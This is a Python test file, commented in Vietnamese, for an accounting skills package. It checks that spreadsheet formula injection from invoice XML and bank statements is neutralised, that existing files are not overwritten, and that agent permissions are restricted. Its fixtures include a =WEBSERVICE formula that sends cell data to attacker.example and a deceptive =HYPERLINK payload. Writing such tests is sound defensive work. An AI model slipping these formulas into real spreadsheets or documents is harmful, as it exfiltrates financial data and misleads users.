"""Test cho các thay đổi của nhánh vn-custom (skill-ketoan-tai-chinh). Chạy: python3 tests/test_vn_custom.py

Gồm: self-test mọi script upstream, chống chèn công thức từ hóa đơn XML và sao kê ngân hàng, chống ghi đè, cấu hình quyền.
"""
import json
import re
import subprocess
import sys
import tempfile
from pathlib import Path

GOC = Path(__file__).resolve().parent.parent
S = GOC / "skills"
LOI = []


def kiem(ten, dk, chi_tiet=""):
    print(("  ok  " if dk else "  SAI ") + ten)
    if not dk:
        LOI.append(ten)
        print("       ", str(chi_tiet)[:400])


def chay(*args, cwd=None):
    return subprocess.run([sys.executable, *map(str, args)], capture_output=True, text=True, timeout=120, cwd=cwd)


def o_cong_thuc(path):
    from openpyxl import load_workbook
    return [(c.coordinate, c.data_type, c.value) for ws in load_workbook(path).worksheets
            for row in ws.iter_rows() for c in row if isinstance(c.value, str) and c.value.startswith("=")]


def test_self_test_upstream():
    print("test_self_test_upstream")
    for f in sorted(S.glob("*/scripts/*.py")):
        if f.name == "an_toan.py" or "self_test" not in f.read_text(encoding="utf-8"):
            continue
        r = chay(f, "--self-test")
        kiem(f"{f.parent.parent.name}/{f.name}", "OK" in r.stdout, r.stdout[-200:] + r.stderr[-200:])
    r = chay(GOC / "shared/scripts/an_toan.py")
    kiem("doctest an_toan.py", "self-test OK" in r.stdout, r.stdout)


def test_hoa_don_xml_doc_hai():
    print("test_hoa_don_xml_doc_hai")
    sc = S / "doc-hoa-don-xml/scripts/doc_hoa_don.py"
    sys.path.insert(0, str(sc.parent))
    import importlib.util
    spec = importlib.util.spec_from_file_location("dhd", sc)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    x = m.MAU.format(so=101, ngay="2026-10-12", mban="0300000001", mmua="0312345678", thue=400000)
    x = re.sub(r"(<NBan>.*?<Ten>)(.*?)(</Ten>)",
               lambda g: g.group(1) + '=WEBSERVICE("http://attacker.example/?d="&amp;C2)' + g.group(3), x, count=1, flags=re.S)
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "xml").mkdir()
        (Path(d) / "xml" / "a.xml").write_text(x, encoding="utf-8")
        r = chay(sc, Path(d) / "xml", "--mst-cua-toi", "0312345678", "--csv", Path(d) / "k.csv", "--xlsx", Path(d) / "k.xlsx")
        cell = o_cong_thuc(Path(d) / "k.xlsx")
        doc_hai = [c for c in cell if "WEBSERVICE" in c[2]]
        kiem("Tên người bán =WEBSERVICE(...) thành chữ, không thành công thức", doc_hai and all(c[1] == "s" for c in doc_hai), cell)
        kiem("Công thức SUM của script vẫn chạy", any(c[2].startswith("=SUM") and c[1] == "f" for c in cell), cell)
        kiem("Có cảnh báo cho người dùng", "CẢNH BÁO" in r.stderr, r.stderr)
        csv_txt = (Path(d) / "k.csv").read_text(encoding="utf-8-sig")
        kiem("CSV bảng kê vô hiệu hóa ô =", "\"'=WEBSERVICE" in csv_txt, csv_txt[:300])
        r = chay(sc, Path(d) / "xml", "--mst-cua-toi", "0312345678", "--xlsx", Path(d) / "k.xlsx")
        kiem("Không ghi đè bảng kê đã có", r.returncode == 2 and "đã tồn tại" in r.stderr, r.stderr)
        r = chay(sc, Path(d) / "xml", "--mst-cua-toi", "0312345678", "--xlsx", Path(d) / "k.xlsx", "--ghi-de")
        kiem("--ghi-de thì cho ghi", r.returncode == 0, r.stderr)


def test_sao_ke_doc_hai():
    print("test_sao_ke_doc_hai")
    sc = S / "doi-soat/scripts/doi_soat_ngan_hang.py"
    with tempfile.TemporaryDirectory() as d:
        so = Path(d) / "so.csv"
        sk = Path(d) / "sk.csv"
        so.write_text("ngay,so_ct,dien_giai,thu,chi\n2026-10-02,BC01,Thu tiền KH A,11.000.000,\n", encoding="utf-8")
        sk.write_text("ngay,mo_ta,thu,chi\n03/10/2026,CTY A CHUYEN TIEN,11000000,\n"
                      "05/10/2026,\"=HYPERLINK(\"\"http://attacker.example\"\",\"\"Hoan tien\"\")\",500000,\n", encoding="utf-8")
        out = Path(d) / "ds.xlsx"
        r = chay(sc, so, sk, "--xlsx", out)
        cell = o_cong_thuc(out) if out.exists() else []
        doc_hai = [c for c in cell if "HYPERLINK" in c[2]]
        kiem("Diễn giải sao kê =HYPERLINK(...) thành chữ", out.exists() and doc_hai and all(c[1] == "s" for c in doc_hai),
             (r.stderr[-300:], cell))


def test_khac():
    print("test_khac")
    sc = S / "thue-gtgt-dn/scripts/huong_dan_to_khai.py"
    with tempfile.TemporaryDirectory() as d:
        f = Path(d) / "hd.docx"
        f.write_text("GOC", encoding="utf-8")
        r = chay(sc, "--ra", f, cwd=d)
        kiem("huong_dan_to_khai không ghi đè .docx đã có", f.read_text(encoding="utf-8") == "GOC", r.stdout[-200:] + r.stderr[-200:])
    kiem(".mcp.json rỗng", json.loads((GOC / ".mcp.json").read_text())["mcpServers"] == {})
    for sc in sorted(S.glob("*/scripts")):
        kiem(f"{sc.parent.name}: có an_toan.py", (sc / "an_toan.py").exists())
    for a in sorted((GOC / "agents").glob("*.md")) if (GOC / "agents").exists() else []:
        tools = next((l for l in a.read_text(encoding="utf-8").splitlines() if l.startswith("tools:")), "")
        kiem(f"agent {a.stem}: không có Write/Edit", tools and "Write" not in tools and "Edit" not in tools, tools)


if __name__ == "__main__":
    for f in [test_self_test_upstream, test_hoa_don_xml_doc_hai, test_sao_ke_doc_hai, test_khac]:
        f()
    print("KẾT QUẢ:", "TẤT CẢ ĐẠT" if not LOI else f"{len(LOI)} LỖI: {LOI}")
    sys.exit(1 if LOI else 0)
